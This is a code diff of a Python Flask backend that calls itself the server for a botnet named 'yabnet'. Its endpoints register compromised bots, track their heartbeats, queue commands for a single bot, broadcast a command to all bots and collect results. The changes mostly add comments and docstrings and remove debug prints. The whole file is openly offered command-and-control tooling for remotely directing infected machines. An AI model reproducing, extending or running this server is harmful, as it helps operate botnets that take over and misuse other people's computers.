@@ -6,6 +6,18 @@ from models import Bot
 from models import Command
 from models import db 
 
+"""
+Name: server.py 
+Description: Python Flask Backend for the botnet. Takes care of the bot/command database and the API related with it. 
+Also takes are of master console's request/response. 
+
+TODO: Add "lastcheckin" in Bot. Upon master's "list" command, 
+go through all the Bots and remove all the bots which did not checkin
+for 5 cycles 
+TODO2: Actually make a working server 
+
+"""
+
 app = Flask(__name__)
 app.config['DEBUG'] = True
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///yabnet.sqlite3'
@@ -17,11 +29,6 @@ FIRSTCONTACTKEY = 'firstcontactkey'
 REGISTERKEY = 'registerkey'
 MASTERKEY = 'masterkey'
 
-"""
-TODO: Add "lastcheckin" in Bot. Upon master's "list" command, 
-go through all the Bots and remove all the bots which did not checkin
-for 5 cycles 
-"""
 
 def init_db():
     db.drop_all()
@@ -34,7 +41,10 @@ def hello_world():
 
 @app.route('/heartbeat', methods=['POST'])
 def heartbeat():
-
+    """
+    Description: Endpoint which takes report of bots' heartbeat. Will check
+    if the bot is still alive, and update the timestamp of the bot as well. 
+    """
     if request.method != 'POST':
         return jsonify({'error': 'wrong HTTP method'})
 
@@ -45,6 +55,7 @@ def heartbeat():
 
     print("[DEBUG] user = ", user)
 
+    # See if the bot exists, and if it does, update/refresh the timestamp of the bot.
     query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
     query_bot.set_timestamp(datetime.now())
 
@@ -107,6 +118,7 @@ def register():
 
     print("[DEBUG] firstcontact data = ", data)
 
+    # Error checking for post request and data parameters 
     try:
         if data is None:
             return jsonify({'error': 'Could not process body parameters'})
@@ -116,11 +128,8 @@ def register():
             return jsonify({'error': 'ip is required'})
         if bot_os is None:
             return jsonify({'error': 'os is required'})
-
-        #print ("[DEBUG] registerkey = ", registerkey)
-        #print ("[DEBUG] ip = ", bot_ip)
-        #print ("[DEBUG] os = ", bot_os)
-        
+   
+        # Check if bot already exists in the database      
         try:
             query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
         except Exception as e:
@@ -129,6 +138,7 @@ def register():
         if query_bot is not None:
             return jsonify({'error': 'Bot already registered'})
 
+        # Register a new bot, and add it to the database 
         else:
             print("[+] Added a new bot !")
             bot = Bot(bot_ip, bot_os, bot_user)
@@ -159,10 +169,6 @@ def botpush(bot_ip):
     masterkey = data['masterkey']
     cmd = data['cmd']
 
-    #print("[DEBUG] masterkey = ", masterkey)
-    #print("[DEBUG] bot_ip = ", bot_ip)
-    #print("[DEBUG] cmd = ", cmd)
-
     try:
         if data is None:
             return jsonify({'error': 'Could not process body parameters'})
@@ -174,8 +180,8 @@ def botpush(bot_ip):
         # Query and get the bot which has the bot_ip, and then append the command to it 
         query_bot = Bot.query.filter_by(ip=bot_ip).first()
         cmd = Command(cmd, query_bot.id, bot_ip)
-        #cmd.set_latest_true()
 
+        # Actually push the command to the bot. If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
         if len(query_bot.cmds) < 1:
             try:
                 query_bot.cmds.append(cmd)
@@ -187,15 +193,12 @@ def botpush(bot_ip):
                 return jsonify({'result': 'Command staged'})
 
             except Exception as e:
-                print("[!!] ERROR for command!")
-                print(e)
-                return jsonify({'error': 'Error occurred'})
+                return jsonify({'error': 'Error occurred while staging command'})
         else:
             return jsonify({'error': 'Only one command can be staged'})
 
     except Exception as e:
         return jsonify({ 'error': '[-] Bot does not exist. ' + str(e) }) 
-    #command = Command()
 
 @app.route('/bot/<bot_ip>/task', methods=['POST'])
 def bottask(bot_ip):
@@ -222,7 +225,6 @@ def bottask(bot_ip):
 
         # Get the bot corresponding with the bot_ip 
         query_bot = Bot.query.filter_by(ip=bot_ip).first()
-        query_bot.set_timestamp(datetime.now())
 
         # Try getting commands, from the oldest staged command to the lastest staged command. 
         try:
@@ -297,6 +299,11 @@ def botresult(bot_ip):
 # TODO: Change the result to json, as an API endpoint 
 @app.route('/bot/list', methods=['GET'])
 def botlist():
+    """
+    Description: View and return all the bots in the server database
+    TODO: Implement returning bot objects in json format 
+    """
+
     botlist = Bot.query.all()
 
     # Refresh bot list. Remove bot if it hasn't come back for TIMER*5 
@@ -307,7 +314,6 @@ def botlist():
 
 
     result = '' 
-    #result = []
 
     # Show bot list 
     for bot in botlist:
@@ -327,20 +333,17 @@ def commandlist():
 
     return result 
 
-"""
-    query_bot = Bot.query.filter_by(ip=bot_ip).first()
-    cmd = Command(cmd, query_bot.id, bot_ip)
-    #cmd.set_latest_true()
-
-    if len(query_bot.cmds) < 1:
-        try:
-            query_bot.cmds.append(cmd)
-            db.session.add(cmd)
-            db.session.commit()
-"""
 
 @app.route('/bot/broadcast', methods=['POST'])
 def broadcast():
+    """
+    Description: Push the command into all the bots in the database 
+
+    [POST]
+        - masterkey = Masterkey to validate and authenticate master
+        - command = Actual command to be pushed to the entire bots 
+    """
+
     if request.method != 'POST':
         return jsonify({'error': 'wrong HTTP method'})
 
@@ -363,7 +366,6 @@ def broadcast():
         bot.cmds.append(cmd)
         db.session.add(cmd)
     db.session.commit()
-
 
 
 
